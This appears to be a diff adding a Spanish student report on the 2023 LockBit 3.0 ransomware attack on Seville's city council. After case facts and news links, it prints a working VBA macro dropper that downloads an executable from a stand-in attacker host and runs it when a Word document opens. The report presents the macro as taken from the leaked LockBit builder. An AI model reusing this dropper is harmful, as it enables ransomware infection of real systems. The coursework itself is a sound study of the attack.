@@ -1,1 +1,55 @@
-# Vector-Ataque
+# 🛡️ Análisis Forense: LockBit 3.0 y el Caso Ayuntamiento de Sevilla
+
+**Autor:** [Tu Nombre]  
+**Asignatura:** Seguridad y Alta Disponibilidad  
+**Tema:** Análisis de Vectores de Ataque (Ransomware)
+
+---
+
+## 1. 🚨 La Escena del Crimen: El Caso Sevilla (2023)
+
+El **5 de septiembre de 2023**, el Ayuntamiento de Sevilla sufrió un ciberataque crítico que paralizó los servicios digitales de la ciudad, obligando a los funcionarios a operar manualmente y desconectando la red interna durante semanas.
+
+### Datos Clave del Incidente
+* **Autoría:** El grupo **LockBit** reivindicó el ataque utilizando su variante **LockBit 3.0 (Black)**.
+* **Impacto:** Se estima el compromiso de **4.000 ordenadores y 800 servidores**. Se ejecutó un "Kill Switch" defensivo cortando la Intranet.
+* **Extorsión:** Se exigió un rescate inicial de **1.5 millones de euros** (elevado posteriormente a 5M€) bajo la amenaza de publicar datos sensibles (Doble Extorsión).
+
+> **Fuentes del caso:**
+> * 📰 [LockBit: el grupo detrás del ciberataque al Ayuntamiento de Sevilla (Cuadernos de Seguridad)](https://cuadernosdeseguridad.com/2023/09/lockbit-ayuntamiento-sevilla/)
+> * 📺 [Hackean la web del Ayuntamiento de Sevilla y piden rescate millonario (La Sexta)](https://www.lasexta.com/noticias/nacional/hackean-web-ayuntamiento-sevilla-piden-rescate-millonario-consistorio_2023090664f8579f714dff0001d87ccd.html)
+
+---
+
+## 2. 🔬 Anatomía Técnica: Vector de Ataque
+
+Dado que no existe un informe forense público, esta investigación reconstruye el vector de ataque más probable basándose en el análisis del **'builder' de LockBit 3.0 filtrado en GitHub**.
+
+### Hipótesis de Entrada: Phishing + Macros VBA
+Aunque LockBit explota RDP, el vector de entrada predominante en administración pública es el **Phishing**. Analizando el código fuente, hemos aislado la macro maliciosa que actúa como *dropper*.
+
+#### Código del Vector de Infección (VBA)
+Este script se oculta en documentos Word adjuntos (facturas/citaciones). Al habilitar la edición, se ejecuta:
+
+```vba
+Sub Document_Open()
+    ' Creación de objetos para conexión HTTP
+    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+    dim bStrm: Set bStrm = createobject("Adodb.Stream")
+    
+    ' 1. Descarga del Payload (LB3.exe) desde el C2 del atacante
+    xHttp.Open "GET", "[http://servidor-atacante.com/LB3.exe](http://servidor-atacante.com/LB3.exe)", False
+    xHttp.Send
+
+    ' 2. Evasión y Persistencia en disco
+    with bStrm
+        .type = 1 '//binary
+        .open
+        .write xHttp.responseBody
+        ' Guarda en C:\Temp para evitar pedir permisos de Admin inmediatos
+        .savetofile "c:\temp\LB3.exe", 2 
+    end with
+
+    ' 3. Ejecución del Ransomware
+    CreateObject("WScript.Shell").Run "c:\temp\LB3.exe"
+End Sub
